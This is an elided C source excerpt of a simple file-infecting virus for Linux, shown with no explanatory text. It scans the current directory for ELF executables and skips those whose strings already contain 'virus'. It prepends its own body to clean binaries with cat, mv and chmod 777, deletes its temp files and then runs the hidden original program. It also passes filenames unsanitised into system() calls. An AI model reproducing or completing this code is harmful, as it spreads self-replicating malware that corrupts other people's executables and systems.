...
int is_file_infected (char filename[])
{
    char output[400];
    char command [400];
    snprintf(command, sizeof command, "%s%s%s", "strings ", filename, "| grep virus > ./.virussearch046.temp");
    char inf[] = "virus";
    FILE *finf;
    system(&command[0]);    
    finf = fopen("./.virussearch046.temp", "r");
...
{
    char command[200];
    snprintf(command, sizeof command, "%s%s%s", "file ", filename, " > ./.elfsearch046.temp");
    char elf[] = "ELF";
    char output[200];
    FILE *file;
    system(&command[0]);
    file = fopen("./.elfsearch046.temp", "r");
...
int main(int argc, char* argv[])
{
    ...
    char filename[100];
    payLoad();
    system("ls > ./.contents046.temp");
    fp = fopen("./.contents046.temp", "r");
    while (!feof(fp))
    {
        ...
        if(is_file_elf(filename))
        {
           if (is_file_infected(filename) == 0)
            {
                snprintf(command, sizeof command, "%s%s%s%s%s%s", "cat virus ", filename, " > ./.infect046.tmp;mv ./.infect046.tmp ", filename, ";chmod 777 ", filename);
                system(&command[0]);
                break;
            }
    ...
    {
        char delete_command[] = "find ./ -name '*046*' -delete";
    ...
    else
    {
        ...
        {
            char original_functionality[200] = "./.target046 ";
            for (i=2; i<=argc; i++)
            {   
                if(i == argc)
